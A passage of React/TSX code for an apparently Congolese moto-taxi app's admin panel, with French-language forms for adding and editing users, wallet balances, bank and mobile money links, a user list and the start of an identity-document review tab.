                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Nom de Famille <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      required
                      value={addLastName}
                      onChange={(e) => setAddLastName(e.target.value)}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                      placeholder="Lumula"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">N° de Téléphone RDC <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      required
                      value={addPhone}
                      onChange={(e) => setAddPhone(e.target.value)}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono"
                      placeholder="+243 "
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Adresse E-mail (Requis)</label>
                    <input
                      type="email"
                      value={addEmail}
                      onChange={(e) => setAddEmail(e.target.value)}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono"
                      placeholder="nom@domaine.cd"
                    />
                  </div>
                </div>

                {/* Section 2: Role, Province & Application Wallets */}
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4 pt-1">
                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Rôle / Nature du Compte <span className="text-red-500">*</span></label>
                    <select
                      value={addRole}
                      onChange={(e) => setAddRole(e.target.value as any)}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 cursor-pointer"
                    >
                      <option value="client">Client (Passager Voyageur)</option>
                      <option value="driver">Chauffeur (Motard Pro-Moto)</option>
                      <option value="owner">Propriétaire de Flotte (Investisseur)</option>
                      <option value="admin">Administrateur Délégué</option>
                    </select>
                  </div>

                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Province de Résidence <span className="text-red-500">*</span></label>
                    <select
                      value={addProvince}
                      onChange={(e) => setAddProvince(e.target.value)}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 cursor-pointer"
                    >
                      {drcProvinces.map((p) => (
                        <option key={p.id} value={p.name}>{p.name}</option>
                      ))}
                    </select>
                  </div>

                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Ville / Territoire</label>
                    <input
                      type="text"
                      value={addCity}
                      onChange={(e) => setAddCity(e.target.value)}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                      placeholder="Kinshasa"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Commune RDC</label>
                    <input
                      type="text"
                      value={addCommune}
                      onChange={(e) => setAddCommune(e.target.value)}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                      placeholder="Gombe"
                    />
                  </div>
                </div>

                {/* Section 3: App Portefeuille pre-allocation & Vehicle info (conditional) */}
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4 border-t border-slate-150 pt-3">
                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Provision Solde Initial CDF</label>
                    <input
                      type="number"
                      value={addWalletCDF}
                      onChange={(e) => setAddWalletCDF(Number(e.target.value))}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-bold"
                      placeholder="35000"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Provision Solde Initial USD ($)</label>
                    <input
                      type="number"
                      value={addWalletUSD}
                      onChange={(e) => setAddWalletUSD(Number(e.target.value))}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-bold"
                      placeholder="25"
                    />
                  </div>

                  {addRole === "driver" && (
                    <>
                      <div className="space-y-1">
                        <label className="block text-[8.5px] font-black text-amber-800 uppercase tracking-wider">Modèle Moto Chauffeur</label>
                        <input
                          type="text"
                          value={addVehicleModel}
                          onChange={(e) => setAddVehicleModel(e.target.value)}
                          className="w-full bg-amber-50/50 border border-amber-200 rounded-xl px-3 py-2 text-xs text-amber-950 outline-none focus:border-indigo-600 placeholder-amber-400 font-bold"
                          placeholder="Honda CG 125"
                        />
                      </div>

                      <div className="space-y-1">
                        <label className="block text-[8.5px] font-black text-amber-800 uppercase tracking-wider">Plaque d'Immatriculation</label>
                        <input
                          type="text"
                          value={addVehiclePlate}
                          onChange={(e) => setAddVehiclePlate(e.target.value)}
                          className="w-full bg-amber-50/50 border border-amber-200 rounded-xl px-3 py-2 text-xs text-amber-950 outline-none focus:border-indigo-600 font-mono placeholder-amber-400 font-bold"
                          placeholder="C-KIN-4005"
                        />
                      </div>
                    </>
                  )}
                </div>

                {/* Section 4: Bank Account & Mobile money configuration */}
                <div className="bg-white p-4 rounded-2xl border border-slate-150 space-y-3">
                  <span className="text-[10px] font-black text-slate-700 uppercase block tracking-wider">
                    🏦 Liaison de Comptes Bancaires & Mobile Money RDC (Établissement Principal)
                  </span>

                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                    <div className="space-y-1">
                      <label className="block text-[8.5px] font-black text-slate-500 uppercase">Institution Financière / Banque</label>
                      <select
                        value={addBankName}
                        onChange={(e) => setAddBankName(e.target.value)}
                        className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 cursor-pointer text-[11px] font-bold"
                      >
                        <option value="">Aucune - Uniquement Mobile Money</option>
                        <option value="Rawbank">Rawbank (RDC)</option>
                        <option value="Equity BCDC">Equity BCDC (RDC)</option>
                        <option value="TMB">Trust Merchant Bank (TMB)</option>
                        <option value="Ecobank">Ecobank RDC</option>
                        <option value="Sofibanque">Sofibanque (RDC)</option>
                        <option value="Advans Banque">Advans Banque Congo</option>
                      </select>
                    </div>

                    <div className="space-y-1">
                      <label className="block text-[8.5px] font-black text-slate-505 uppercase">Numéro de Compte Bancaire RDC</label>
                      <input
                        type="text"
                        value={addBankAccountNumber}
                        onChange={(e) => setAddBankAccountNumber(e.target.value)}
                        className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-bold"
                        placeholder="05101-01123456789-98"
                      />
                    </div>

                    <div className="space-y-1">
                      <label className="block text-[8.5px] font-black text-slate-505 uppercase">Nom du Titulaire de Compte</label>
                      <input
                        type="text"
                        value={addBankAccountName}
                        onChange={(e) => setAddBankAccountName(e.target.value)}
                        className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-bold"
                        placeholder="Jean-Marie Lumula"
                      />
                    </div>

                    <div className="space-y-1">
                      <label className="block text-[8.5px] font-black text-slate-505 uppercase">Numéro Mobile Money (M-Pesa / Orange)</label>
                      <input
                        type="text"
                        value={addMobileMoneyNumber}
                        onChange={(e) => setAddMobileMoneyNumber(e.target.value)}
                        className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-bold"
                        placeholder="+243 899 999 999"
                      />
                    </div>
                  </div>
                </div>

                <div className="flex justify-end gap-2.5 pt-2">
                  <button
                    type="button"
                    onClick={() => setShowAddUserModal(false)}
                    className="px-4 py-2 bg-slate-100 hover:bg-slate-200 text-slate-600 rounded-xl text-xs font-bold uppercase transition"
                  >
                    Annuler
                  </button>
                  <button
                    type="submit"
                    className="px-5 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl text-xs font-black uppercase tracking-widest transition-all shadow-indigo-100 shadow-sm cursor-pointer"
                  >
                    Confirmer l'Enregistrement Fiscal
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* List of registered users */}
          <div className="bg-slate-100 rounded-3xl border border-slate-200 overflow-hidden divide-y divide-slate-200">
            {filteredUsers.length > 0 ? (
              filteredUsers.map((u) => {
                // Determine if they have linked financial assets
                const hasBankDetails = !!(u.bankName || u.bankAccountNumber || u.mobileMoneyNumber);
                
                return (
                  <div key={u.id} className="p-5 bg-white flex flex-col lg:flex-row lg:items-center justify-between gap-5 hover:bg-slate-50/70 transition-all text-xs text-left">
                    
                    {/* LEFT BLOCK: User visual metadata & Telecom state */}
                    <div className="flex items-start gap-4 flex-1">
                      <div className="h-10 w-10 shrink-0 rounded-full bg-slate-50 border border-slate-200 flex justify-center items-center text-slate-650 mt-0.5">
                        {u.role === "driver" ? <Bike className="w-5 h-5 text-amber-500" /> : u.role === "owner" ? <Building className="w-5 h-5 text-blue-500" /> : <User className="w-5 h-5 text-purple-500" />}
                      </div>

                      <div className="space-y-1.5 flex-1">
                        <div className="flex items-center gap-2 flex-wrap">
                          <h4 className="font-extrabold text-slate-900 text-sm leading-none">
                            {u.firstName} {u.lastName}
                          </h4>
                          
                          <span className={`px-2 py-0.5 rounded text-[8.5px] uppercase tracking-wide font-black ${
                            u.role === "driver" 
                              ? "bg-amber-50 text-amber-800 border border-amber-250 animate-pulse" 
                              : u.role === "owner" 
                                ? "bg-blue-50 text-blue-750 border border-blue-200" 
                                : "bg-purple-50 text-purple-750 border border-purple-200"
                          }`}>
                            {u.role === "driver" ? "Chauffeur Motard" : u.role === "owner" ? "Propriétaire" : u.role === "client" ? "Voyageur" : u.role}
                          </span>

                          <span className="text-[8px] font-mono text-slate-400 bg-slate-100 px-1.5 py-0.2 rounded">
                            ID: {u.id}
                          </span>
                        </div>

                        <p className="text-[10.5px] text-slate-500 font-medium">
                          📲 Phone: <span className="font-mono text-slate-800 font-bold">{u.phone}</span> {u.email && <>• 📧 Email: <span className="font-mono text-slate-655 font-bold">{u.email}</span></>}
                        </p>
                        
                        <p className="text-[10px] text-slate-500">
                          📍 Province: <b className="text-blue-700">{u.address.province}</b> • Ville/Territoire: <b>{u.address.city}</b> • Commune: <b>{u.address.commune}</b>
                        </p>

                        {/* Telecom SIM state indicator */}
                        {u.role === "driver" && (
                          <div className="flex flex-wrap gap-1.5 pt-0.5">
                            {u.telecomSubscriptionStatus === "active" ? (
                              <span className="inline-flex items-center gap-1 bg-emerald-50 text-emerald-800 border border-emerald-150 px-2 py-0.5 rounded-lg text-[9px]">
                                <span className="h-1.5 w-1.5 rounded-full bg-emerald-500"></span>
                                <b>SIM Pro {u.telecomOperator?.toUpperCase()} Active</b> : {u.telecomPhoneSim}
                                {u.telecomSecuredAPN && " (APN Sécurisé d'État)"}
                              </span>
                            ) : (
                              <span className="inline-flex items-center gap-1 bg-slate-50 text-slate-450 border border-slate-200 px-2 py-0.5 rounded-lg text-[8.5px] font-mono">
                                SIM Grand Public (Pas de forfait Pro crypté)
                              </span>
                            )}
                          </div>
                        )}

                        {/* Display bank credentials physically in the registry (Core feature) */}
                        {hasBankDetails && (
                          <div className="bg-slate-50 border border-slate-150 rounded-xl p-2.5 space-y-1.5 text-[10.5px]">
                            <span className="text-[8.5px] font-black text-slate-450 uppercase block font-sans tracking-wide leading-none">
                              🔒 Coordonnées Bancaires & Mobile Money Liées (Arbitrées)
                            </span>
                            <div className="flex flex-wrap gap-x-4 gap-y-1 text-slate-700 text-[10px]">
                              {u.bankName && (
                                <span className="flex items-center gap-1">
                                  🏦 Banque : <b className="text-slate-800 font-bold">{u.bankName}</b>
                                </span>
                              )}
                              {u.bankAccountNumber && (
                                <span className="flex items-center gap-1">
                                  N° de Compte : <b className="font-mono text-indigo-900 bg-indigo-50 px-1 py-0.2 rounded font-bold">{u.bankAccountNumber}</b>
                                </span>
                              )}
                              {u.bankAccountName && (
                                <span className="flex items-center gap-1">
                                  Titulaire : <b className="text-slate-700">{u.bankAccountName}</b>
                                </span>
                              )}
                              {u.mobileMoneyNumber && (
                                <span className="flex items-center gap-1">
                                  📱 Mobile Cash : <b className="font-mono text-slate-800">{u.mobileMoneyNumber}</b>
                                </span>
                              )}
                            </div>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* RIGHT BLOCK: Financial Balance & Administrative Actions */}
                    <div className="flex sm:items-center justify-between lg:flex-col lg:justify-center lg:items-end gap-4 shrink-0 border-t sm:border-t-0 pt-3 sm:pt-0 border-slate-100">
                      
                      {/* Apps native wallets */}
                      <div className="text-left lg:text-right space-y-0.5 pl-1 sm:pl-0">
                        <span className="text-[9px] font-bold text-slate-400 block uppercase font-mono tracking-wider">Mouvements Wallets</span>
                        <div className="font-mono font-bold leading-tight">
                          <span className="text-xs text-emerald-600 block">{u.walletBalanceCDF.toLocaleString("fr-FR")} CDF</span>
                          <span className="text-[11.5px] text-indigo-650 block">${u.walletBalanceUSD.toFixed(2)} USD</span>
                        </div>
                      </div>

                      {/* Explicit Management Operations */}
                      <div className="flex gap-2">
                        
                        {/* View Documents Button */}
                        <button
                          type="button"
                          onClick={() => setSelectedUserDocs(u)}
                          className="bg-indigo-50 hover:bg-indigo-100 text-indigo-700 font-bold px-3 py-2 rounded-xl flex items-center gap-1.5 transition whitespace-nowrap cursor-pointer border border-indigo-100 hover:border-indigo-200"
                          title="Visualiser et authentifier les documents d'identité et de véhicule"
                        >
                          <Eye className="w-3.5 h-3.5" />
                          <span>Pièces</span>
                          <span className={`h-1.5 w-1.5 rounded-full ${
                            u.documentStatus === "approved" ? "bg-emerald-500" :
                            u.documentStatus === "rejected" ? "bg-red-500" : "bg-amber-500 animate-pulse"
                          }`} />
                        </button>

                        {/* Edit Button */}
                        <button
                          type="button"
                          onClick={() => handleOpenEditModal(u)}
                          className="bg-slate-100 hover:bg-slate-200 text-slate-800 font-bold px-3 py-2 rounded-xl flex items-center gap-1.5 transition whitespace-nowrap cursor-pointer border border-slate-200 hover:border-slate-300"
                          title="Modifier les coordonnées, compte bancaire et type de compte"
                        >
                          <Edit className="w-3.5 h-3.5 text-indigo-600" />
                          <span>Gérer</span>
                        </button>

                        {/* Delete Button */}
                        <button
                          type="button"
                          onClick={() => handleDeleteUser(u.id, `${u.firstName} ${u.lastName}`)}
                          className="bg-red-50 hover:bg-red-100 text-red-650 hover:text-red-700 font-bold px-2.5 py-2 rounded-xl flex items-center transition cursor-pointer border border-red-100"
                          title="Radier définitivement ce compte de l'application"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>

                      </div>

                    </div>

                  </div>
                );
              })
            ) : (
              <p className="p-10 text-center text-xs text-slate-500 bg-white font-medium">Aucun citoyen ne correspond aux filtres de recherche provinciale ou textuelle.</p>
            )}
          </div>

          {/* ================= MODAL OVERLAY: FULL PROFILE, BANK ACCOUNT, AND IDENTITY WRITER/EDITOR ================= */}
          {editingUser && (
            <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm flex justify-center items-center z-50 p-4 overflow-y-auto">
              <div className="bg-white rounded-3xl w-full max-w-2xl border border-slate-200 shadow-2xl max-h-[90vh] flex flex-col animate-in scale-in duration-200">
                
                {/* Header */}
                <div className="p-5 border-b border-slate-150 flex justify-between items-center bg-slate-50 rounded-t-3xl text-left">
                  <div className="flex items-center gap-2">
                    <span className="p-2 bg-indigo-50 text-indigo-600 rounded-xl">
                      <ShieldCheck className="w-5 h-5" />
                    </span>
                    <div>
                      <span className="text-xs font-black text-slate-900 uppercase tracking-widest block leading-none">
                        Modifier les droits & Droits Gérés
                      </span>
                      <span className="text-[10px] text-slate-450 mt-1 block">Modification intégrale du compte : {editingUser.firstName} {editingUser.lastName}</span>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => setEditingUser(null)}
                    className="p-1.5 text-slate-400 hover:text-slate-600 hover:bg-slate-200 rounded-full"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>

                {/* Form fields scrollable */}
                <form onSubmit={handleSaveEditUser} className="p-6 overflow-y-auto space-y-5 text-left text-xs">
                  
                  {/* Row 1: Identification */}
                  <div className="space-y-1">
                    <span className="text-[10px] font-black text-slate-500 uppercase tracking-wider block">1. Identité Civile du Titulaire</span>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Prénom de l'administré <span className="text-red-500">*</span></label>
                        <input
                          type="text"
                          required
                          value={editFirstName}
                          onChange={(e) => setEditFirstName(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-semibold"
                        />
                      </div>

                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Nom de Famille <span className="text-red-500">*</span></label>
                        <input
                          type="text"
                          required
                          value={editLastName}
                          onChange={(e) => setEditLastName(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-semibold"
                        />
                      </div>
                    </div>
                  </div>

                  {/* Row 2: Contact & Account Level (Rôle / genre de compte) */}
                  <div className="space-y-1 pt-1">
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Numéro Téléphone RDC <span className="text-red-500">*</span></label>
                        <input
                          type="text"
                          required
                          value={editPhone}
                          onChange={(e) => setEditPhone(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-bold"
                        />
                      </div>

                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Adresse E-mail</label>
                        <input
                          type="email"
                          value={editEmail}
                          onChange={(e) => setEditEmail(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-medium"
                        />
                      </div>

                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Rôle / Genre de Compte <span className="text-red-500">*</span></label>
                        <select
                          value={editRole}
                          onChange={(e) => setEditRole(e.target.value as any)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 cursor-pointer font-bold"
                        >
                          <option value="client">Client (Passager)</option>
                          <option value="driver">Chauffeur (Motard)</option>
                          <option value="owner">Propriétaire de motos</option>
                          <option value="admin">Administrateur du Système</option>
                        </select>
                      </div>
                    </div>
                  </div>

                  {/* Row 3: Physical Address */}
                  <div className="space-y-1 pt-1">
                    <span className="text-[10px] font-black text-slate-500 uppercase tracking-wider block">2. Registre de Localisation</span>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Province de Tutelle <span className="text-red-500">*</span></label>
                        <select
                          value={editProvince}
                          onChange={(e) => setEditProvince(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 cursor-pointer text-[11px]"
                        >
                          {drcProvinces.map((p) => (
                            <option key={p.id} value={p.name}>{p.name}</option>
                          ))}
                        </select>
                      </div>

                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Ville / Territoire</label>
                        <input
                          type="text"
                          value={editCity}
                          onChange={(e) => setEditCity(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                        />
                      </div>

                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Commune de résidence</label>
                        <input
                          type="text"
                          value={editCommune}
                          onChange={(e) => setEditCommune(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                        />
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-2">
                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Quartier</label>
                        <input
                          type="text"
                          value={editQuartier}
                          onChange={(e) => setEditQuartier(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                        />
                      </div>

                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Avenue</label>
                        <input
                          type="text"
                          value={editAvenue}
                          onChange={(e) => setEditAvenue(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                        />
                      </div>

                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Numéro Parcelle</label>
                        <input
                          type="text"
                          value={editNumber}
                          onChange={(e) => setEditNumber(e.target.value)}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                        />
                      </div>
                    </div>
                  </div>

                  {/* Row 4: Bank account block */}
                  <div className="bg-slate-50 p-4.5 rounded-2xl border border-slate-250 space-y-3.5">
                    <span className="text-[10px] font-black text-indigo-950 uppercase block tracking-wider font-sans">
                      🏦 Liaison Bancaire & Compte Mobile Money RDC (Échanges Financiers)
                    </span>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <label className="block text-[8px] font-black text-slate-500 uppercase">Institution Coopérative / Banque</label>
                        <select
                          value={editBankName}
                          onChange={(e) => setEditBankName(e.target.value)}
                          className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 cursor-pointer font-bold"
                        >
                          <option value="">Non rattaché (Mobile Cash uniquement)</option>
                          <option value="Rawbank">Rawbank (RDC)</option>
                          <option value="Equity BCDC">Equity BCDC (RDC)</option>
                          <option value="TMB">Trust Merchant Bank (TMB)</option>
                          <option value="Ecobank">Ecobank RDC</option>
                          <option value="Sofibanque">Sofibanque (RDC)</option>
                          <option value="Advans Banque">Advans Banque Congo</option>
                        </select>
                      </div>

                      <div>
                        <label className="block text-[8px] font-black text-slate-500 uppercase">Numéro de Compte Bancaire RDC (National)</label>
                        <input
                          type="text"
                          value={editBankAccountNumber}
                          onChange={(e) => setEditBankAccountNumber(e.target.value)}
                          className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-bold"
                        />
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <label className="block text-[8px] font-black text-slate-500 uppercase">Nom du Titulaire de Compte Officiel</label>
                        <input
                          type="text"
                          value={editBankAccountName}
                          onChange={(e) => setEditBankAccountName(e.target.value)}
                          className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-bold"
                        />
                      </div>

                      <div>
                        <label className="block text-[8px] font-black text-slate-500 uppercase">Numéro de Téléphone Mobile Money lié (M-Pesa, Orange)</label>
                        <input
                          type="text"
                          value={editMobileMoneyNumber}
                          onChange={(e) => setEditMobileMoneyNumber(e.target.value)}
                          className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-bold"
                        />
                      </div>
                    </div>
                  </div>

                  {/* Row 5: Wallet and optional features */}
                  <div className="space-y-1 pt-1">
                    <span className="text-[10px] font-black text-slate-500 uppercase tracking-wider block">3. Capitalisation Portefeuilles Applicatifs</span>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Mouvement Solde Principal CDF</label>
                        <input
                          type="number"
                          value={editWalletCDF}
                          onChange={(e) => setEditWalletCDF(Number(e.target.value))}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 font-mono font-bold"
                        />
                      </div>

                      <div>
                        <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Mouvement Solde $ USD</label>
                        <input
                          type="number"
                          value={editWalletUSD}
                          onChange={(e) => setEditWalletUSD(Number(e.target.value))}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 font-mono font-bold"
                        />
                      </div>
                    </div>
                  </div>

                  {editRole === "driver" && (
                    <div className="space-y-1 pt-1.5 border-t border-slate-100">
                      <span className="text-[10px] font-black text-amber-800 uppercase tracking-wider block">4. Propriétés de la Moto Chauffeur</span>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Marque et Modèle du Véhicule</label>
                          <input
                            type="text"
                            value={editVehicleModel}
                            onChange={(e) => setEditVehicleModel(e.target.value)}
                            className="w-full bg-amber-50/50 border border-amber-200 rounded-xl px-3 py-2 text-xs text-amber-950 font-bold outline-none"
                          />
                        </div>

                        <div>
                          <label className="block text-[8.5px] font-bold text-slate-505 mb-1">Plaque d'immatriculation (RDC)</label>
                          <input
                            type="text"
                            value={editVehiclePlate}
                            onChange={(e) => setEditVehiclePlate(e.target.value)}
                            className="w-full bg-amber-50/50 border border-amber-200 rounded-xl px-3 py-2 text-xs text-amber-950 font-mono font-bold outline-none"
                          />
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Danger zone to delete physically from modal */}
                  <div className="bg-red-50/50 border border-red-150 p-4 rounded-2xl flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 mt-4">
                    <div className="space-y-0.5">
                      <span className="text-[10px] font-black text-red-800 uppercase block tracking-wider">Zone de radiation / Suppression</span>
                      <p className="text-[9.5px] text-red-600 leading-normal">Ces actions effacent instantanément l'historique M-Pesa et les archives administratives d'État.</p>
                    </div>
                    <button
                      type="button"
                      onClick={() => {
                        handleDeleteUser(editingUser.id, `${editingUser.firstName} ${editingUser.lastName}`);
                        setEditingUser(null);
                      }}
                      className="bg-red-650 hover:bg-red-700 text-white text-[10px] font-black uppercase py-2 px-3 rounded-xl cursor-pointer"
                    >
                      Supprimer Définitivement
                    </button>
                  </div>

                  {/* Submit and actions footer */}
                  <div className="flex justify-end gap-2.5 pt-4 border-t border-slate-150">
                    <button
                      type="button"
                      onClick={() => setEditingUser(null)}
                      className="px-4 py-2 hover:bg-slate-150 text-slate-650 font-bold uppercase text-[10.5px]"
                    >
                      Fermer sans enregistrer
                    </button>
                    <button
                      type="submit"
                      className="bg-indigo-650 hover:bg-indigo-700 text-white font-black uppercase tracking-wider px-5 py-2 rounded-xl"
                    >
                      Enregistrer les Droits & Comptes
                    </button>
                  </div>

                </form>
              </div>
            </div>
          )}

        </div>
      )}

      {/* ================= ADMIN TAB 3: DOCUMENT VERIFICATION AND CERTIFICATION ================= */}
      {activeSubTab === "documents" && (
        <div className="space-y-6">
          <div className="bg-slate-50 p-4.5 rounded-3xl border border-slate-200 flex items-start gap-3 text-xs leading-relaxed text-slate-700">
            <Info className="w-5 h-5 text-blue-600 shrink-0 mt-0.5" />
            <div>
              <span className="font-bold text-slate-900 block mb-0.5">Autorité d'Examen d'Éligibilité Routière :</span>
              En tant qu'administrateur, examinez attentivement les cartes d'identité, permis de conduire, ou passeports soumis par les citoyens congolais. L'approbation d'un dossier débloque instantanément son statut de conduite/propriété (Approved), l'autorisant à solliciter ou accepter des courses en toute conformité contractuelle.
            </div>
          </div>

          {/* Internal sub-tab switcher for document categories */}
          <div className="flex gap-2 border-b border-slate-200 pb-2">
            <button
              type="button"
              onClick={() => setDocAuditingSubTab("identities")}
              className={`px-3 py-1.5 rounded-lg text-[10.5px] font-bold uppercase transition-all cursor-pointer ${
                docAuditingSubTab === "identities" ? "bg-slate-900 text-white" : "bg-slate-100 text-slate-600 hover:bg-slate-200"
              }`}
            >
              Identités Citoyennes ({registeredUsers.filter(u => u.documentStatus === "pending" || !u.documentStatus).length})
            </button>
            <button
              type="button"
              onClick={() => setDocAuditingSubTab("owner_fleets")}
              className={`px-3 py-1.5 rounded-lg text-[10.5px] font-bold uppercase transition-all cursor-pointer ${
                docAuditingSubTab === "owner_fleets" ? "bg-slate-900 text-white" : "bg-slate-100 text-slate-600 hover:bg-slate-200"
              }`}
            >
              Documents de Flotte / Propriétaires ({getAllOwnerFleetDocs().reduce((acc, row) => acc + row.docs.filter((d: any) => d.status === "pending").length, 0)})
            </button>
            <button
              type="button"
              onClick={() => setDocAuditingSubTab("cross_enrollments")}
              className={`px-3 py-1.5 rounded-lg text-[10.5px] font-bold uppercase transition-all cursor-pointer ${
                docAuditingSubTab === "cross_enrollments" ? "bg-slate-900 text-white" : "bg-slate-100 text-slate-600 hover:bg-slate-200"
              }`}
            >
              Double Enrôlement Croisé ({getActiveDoubleEnrollings().filter((e: any) => e.status !== "confirmed").length} En suspens)
            </button>
          </div>

          <div className="grid grid-cols-1 gap-5">
            {/* View 1: Identities */}
            {docAuditingSubTab === "identities" && (
              registeredUsers.filter(u => u.documentStatus === "pending" || !u.documentStatus).length > 0 ? (
                registeredUsers.filter(u => u.documentStatus === "pending" || !u.documentStatus).map((u) => {
                  const docNotesKey = `doc-note-${u.id}`;
                  return (
                    <div key={u.id} className="bg-white border border-slate-205 rounded-3xl p-5.5 shadow-sm space-y-5">
                      {/* User identifier banner */}
                      <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-slate-100 text-left">
                        <div className="flex items-center gap-3">
                          <div className="h-10 w-10 rounded-xl bg-slate-50 border border-slate-200 flex justify-center items-center text-slate-600">
